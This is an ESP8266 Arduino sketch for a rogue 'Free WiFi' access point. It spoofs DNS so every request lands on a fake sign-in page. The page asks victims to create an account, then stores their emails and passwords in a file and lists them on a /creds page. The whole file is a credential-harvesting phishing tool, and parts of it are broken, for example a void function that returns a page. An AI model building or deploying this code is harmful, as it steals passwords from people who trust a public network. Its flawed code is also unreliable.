#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <pgmspace.h>

// User configuration
#define SSID_NAME "Free WiFi"
#define SUBTITLE "Free WiFi service."
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"
#define WEB_TITLE "Sign in to use Free WiFi"

// Function prototypes
void readData();
void writeData(String data);
void deleteData();

// Init System Settings
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String data = "";
String Credentials = "";
int savedData = 0;
int timer = 5000;
int i = 0;
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Sanitize input
String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String header(String t) {
  return "<!DOCTYPE html>"
         "<html lang=\"en\">"
         "<head>"
         "<meta charset=\"UTF-8\" />"
         "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />"
         "<title>Nemo Test</title>"
         "<style>"
         "@import url(\"https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap\");"
         "</style>"
         "</head>"
         "<body>";
}

String footer() {
  return "</body></html>";
}

String creds() {
  return "<></>";
}

String clear() {
  return "<></>";
}

void saveCredentials(String email, String password) {
  File file = SPIFFS.open("/credentials.txt", "a");
  if (!file) {
    Serial.println("Failed to open credentials.txt for appending.");
    return;
  }
  // Format the sanitized data as "email,password\n"
  String formattedData = email + "," + password + "\n";
  
  // Write the formatted data to the file
  file.print(formattedData);
  
  file.close();
  Serial.println("Credentials saved: " + formattedData);
}

void getCredentials() {
  File file = SPIFFS.open("/credentials.txt", "r");
  if (!file) {
    webServer.send(500, "text/html", "Failed to open credentials file.");
    return;
  }

  String pageContent = "<!DOCTYPE html><html><body>";
  pageContent += "<h1>Saved Credentials</h1><table border='1'>";
  pageContent += "<tr><th>Email</th><th>Password</th></tr>";
  
  while (file.available()) {
    String line = file.readStringUntil('\n');  // Read one line at a time
    int separatorIndex = line.indexOf(',');
    if (separatorIndex > 0) {
      String email = line.substring(0, separatorIndex);
      String password = line.substring(separatorIndex + 1);
      pageContent += "<tr><td>" + email + "</td><td>" + password + "</td></tr>";
    }
  }

  pageContent += "</table></body></html>";
  file.close();
  return pageContent;
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)

  // Initialize SPIFFS
  if (!SPIFFS.begin()) {
    Serial.println("Failed to mount SPIFFS! Make sure you have uploaded the files.");
    return;
  }

  webServer.on("/post", HTTP_POST, []() {
    if (webServer.hasArg("email") && webServer.hasArg("password")) {
      String email = input("email");        // Sanitize the email input
      String password = input("password");  // Sanitize the password input
      saveCredentials(email, password);     // Save the sanitized credentials
      webServer.send(200, "text/html", "Credentials saved successfully!");
    } else {
      webServer.send(400, "text/html", "Invalid input. Please provide email and password.");
    }
  });
  webServer.on("/creds", HTTP_GET, []() {
    String pageContent = getCredentials();
    webServer.send(200, "text/html", pageContent);
  });
  webServer.on("/clear", []() {
    webServer.send(200, "text/html", clear());
  });

  // Serve specific static files
  webServer.on("/script.js", []() {
    File file = SPIFFS.open("/script.js", "r");
    webServer.streamFile(file, "application/javascript");
    file.close();
  });
  webServer.on("/style.css", []() {
    File file = SPIFFS.open("/style.css", "r");
    webServer.streamFile(file, "text/css");
    file.close();
  });

  webServer.onNotFound([]() {
    String path = webServer.uri();
    if (path == "/" || !path.endsWith(".js") && !path.endsWith(".css")) {
      File file = SPIFFS.open("/index.html", "r");
      webServer.send(201, "text/html", file.readString());
      file.close();
    } else {
      webServer.send(404, "text/plain", "404: File Not Found");
    }
  });

  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(115200);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();

  i++;
  if (i == timer && savedData == 1) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(1000);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(50);
  }
  if (i > timer) { i = 0; }
}
